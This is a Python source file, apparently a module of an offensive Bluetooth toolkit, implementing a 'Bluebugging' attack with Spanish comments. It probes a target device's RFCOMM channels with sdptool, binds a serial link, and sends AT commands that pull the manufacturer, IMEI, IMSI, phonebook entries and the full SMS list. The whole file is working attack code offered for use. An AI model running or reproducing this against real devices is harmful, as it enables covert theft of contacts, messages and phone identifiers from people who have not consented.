"""
Bluebugging - Control del dispositivo vía comandos AT sobre RFCOMM.
Funciona con Bluetooth interno en dispositivos vulnerables.
"""

import subprocess
import time
from typing import Optional

from bluesky.core.engine import BaseModule


class Bluebugging(BaseModule):
    """Bluebugging - Establece conexión RFCOMM y envía comandos AT para controlar el dispositivo."""

    name = "bluebugging"
    description = "Bluebugging: Obtiene control del dispositivo Bluetooth vía comandos AT sobre RFCOMM/SPP"
    author = "Bluesky Project"
    version = "0.1.0"
    cve = ""
    requires_hardware = []
    requires_root = False
    target_type = "classic"
    severity = "critical"

    def run(self):
        """Ejecuta el ataque Bluebugging."""
        target = self.target

        if not target:
            self.result["error"] = "Se requiere una dirección MAC"
            return self.result

        self.result["data"]["target"] = target

        try:
            # Fase 1: Escanear servicios SDP para encontrar SPP/RFCOMM channels
            channels = self._scan_channels(target)
            self.result["data"]["channels_found"] = channels

            if not channels:
                self.result["error"] = "No se encontraron canales RFCOMM/SPP en el target"
                self.result["data"]["note"] = "El dispositivo puede estar protegido o no tener SPP habilitado"
                return self.result

            # Fase 2: Intentar conectar y enviar comandos AT
            for channel in channels:
                at_results = self._try_at_commands(target, channel)
                if at_results:
                    self.result["data"]["rfcomm_channel"] = channel
                    self.result["data"]["at_results"] = at_results
                    self.result["success"] = True
                    return self.result

            self.result["error"] = "Se encontraron canales pero no se pudo establecer control AT"
            self.result["data"]["note"] = "Puede requerir autenticación o el dispositivo no acepta comandos AT"

        except Exception as e:
            self.result["error"] = str(e)
            self.result["success"] = False

        return self.result

    def _scan_channels(self, mac: str) -> list:
        """Escanea canales RFCOMM en el dispositivo target."""
        channels = []

        # Método 1: Usar sdptool para buscar SPP
        try:
            result = subprocess.run(
                ["sdptool", "browse", mac],
                capture_output=True, text=True, timeout=15
            )
            if "Serial" in result.stdout or "SPP" in result.stdout or "Port" in result.stdout:
                import re
                for match in re.finditer(r'Channel\s*:\s*(\d+)', result.stdout):
                    channels.append(int(match.group(1)))
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Método 2: Si sdptool no da resultados, escanear canales comunes
        if not channels:
            # Canales típicos: 1 (SPP), 3 (RFCOMM), 5 (SPP2), etc.
            for ch in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
                try:
                    # Verificar si el canal tiene servicio
                    result = subprocess.run(
                        ["sdptool", "records", "--channel", str(ch), mac],
                        capture_output=True, text=True, timeout=5
                    )
                    if "Protocol" in result.stdout or "Service" in result.stdout:
                        channels.append(ch)
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    continue

        return sorted(set(channels))

    def _try_at_commands(self, mac: str, channel: int) -> list:
        """Intenta enviar comandos AT a través de RFCOMM."""
        results = []
        at_commands = [
            ("AT", "Test connection"),
            ("AT+CGMI", "Manufacturer"),
            ("AT+CGMM", "Model"),
            ("AT+CGMR", "Firmware"),
            ("AT+CGSN", "IMEI/Serial"),
            ("AT+CIMI", "IMSI"),
            ("AT+CPBR=1,10", "Phonebook read"),
            ("AT+CMGL=\"ALL\"", "Messages list"),
            ("AT+CLAC", "Available commands"),
        ]

        # Usar rfcomm para conectar
        rfcomm_dev = f"/dev/rfcomm0"
        try:
            # Bind RFCOMM
            subprocess.run(
                ["rfcomm", "bind", rfcomm_dev, mac, str(channel)],
                capture_output=True, text=True, timeout=5
            )
            time.sleep(0.5)

            if not os.path.exists(rfcomm_dev):
                return results

            # Enviar comandos AT
            import serial
            try:
                ser = serial.Serial(rfcomm_dev, baudrate=115200, timeout=3)
                for cmd, desc in at_commands:
                    try:
                        ser.write(f"{cmd}\r\n".encode())
                        time.sleep(0.3)
                        response = ser.read(1024).decode(errors='replace').strip()
                        if response and "ERROR" not in response:
                            results.append({
                                "command": cmd,
                                "description": desc,
                                "response": response[:200],
                            })
                    except Exception:
                        continue
                ser.close()
            except Exception:
                pass

            # Cleanup
            subprocess.run(["rfcomm", "release", rfcomm_dev],
                         capture_output=True, text=True, timeout=3)

        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        return results

    def check_prerequisites(self) -> tuple:
        """Verifica que rfcomm esté disponible."""
        import shutil
        if not shutil.which("rfcomm"):
            return False, "Se necesita 'rfcomm' (bluez-tools). Instala: sudo apt install bluez-tools"
        if not shutil.which("sdptool"):
            return False, "Se necesita 'sdptool' (bluez). Instala: sudo apt install bluez"
        return True, ""


import os
